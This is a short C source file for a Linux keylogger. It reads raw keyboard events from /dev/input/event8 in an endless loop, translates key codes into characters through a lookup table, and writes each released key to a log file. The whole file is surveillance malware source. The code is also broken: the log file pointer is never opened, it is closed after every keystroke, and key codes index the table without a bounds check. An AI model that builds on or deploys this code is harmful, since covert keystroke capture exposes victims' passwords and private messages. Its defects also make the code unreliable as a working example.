#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <termios.h>
#include "keylogger.h"

int main(void)
{

    const char *keycodes[] = {
        "\n(NULL)\n", "\n(ESC)\n", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "(BACKSPACE)",
        "\t", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "`", "[RIGHTBRACE]", "\n",
        "[LEFTCTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "´", "\"",
        "[LEFTSHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[RIGHTSHIFT]",
        "[KPASTERISK]", "[LEFTALT]", " ", "[CAPSLOCK]"
    };

    struct input_event k_event;
    int fd = open("/dev/input/event8", O_RDONLY);
    if(fd < 0)
    {
        exit(EXIT_FAILURE);
    }

    FILE *logs;
    int prev_key = 0;

    while(1)
    {
        fflush(stdout);
        read(fd, &k_event, sizeof(k_event));
        if(k_event.type == EV_KEY && k_event.value == 0)
        {
          fprintf(logs, "%s", keycodes[k_event.code]);
          fclose(logs);
        }
    }
    
    return(0);
}
